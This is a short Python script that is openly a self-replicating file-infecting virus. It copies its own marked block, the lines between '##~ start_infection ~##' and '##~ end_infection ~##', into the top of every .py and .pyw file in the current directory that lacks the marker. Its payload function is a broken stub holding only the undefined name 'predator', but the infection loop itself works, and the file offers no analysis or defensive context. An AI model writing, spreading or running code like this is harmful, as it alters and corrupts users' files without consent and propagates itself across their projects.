import sys
import glob
import threading
import os
##~ start_infection ~##

virus_platform=[]
with open(sys.argv[0], "r") as file:
    data=file.readlines()

virus_execution = False
for false_data in data:
    if false_data == "##~ start_infection ~##\n":
        virus_execution = True
    if virus_execution:
        virus_platform.append(false_data)
    if false_data == "##~ end_infection ~##\n":
        break

file_destruction = glob.glob("*.py") + glob.glob("*.pyw")
for usr_files in file_destruction:
    with open(usr_files, "r") as file:
        script_code = file.readlines()

    infection0 = False
    for data in script_code:
        if data == "##~ start_infection ~##\n":
            infection0 = True
            break
    if not infection0:
        debug_virus = []
        debug_virus.extend(virus_platform)
        debug_virus.extend("\n")
        debug_virus.extend(script_code)
        with open(usr_files, "w") as file:
            file.writelines(debug_virus)

## coding malicipous code
def malicious_hacking():
    predator

thread = threading.Thread(target=malicious_hacking())
thread.start()
##~ end_infection ~##
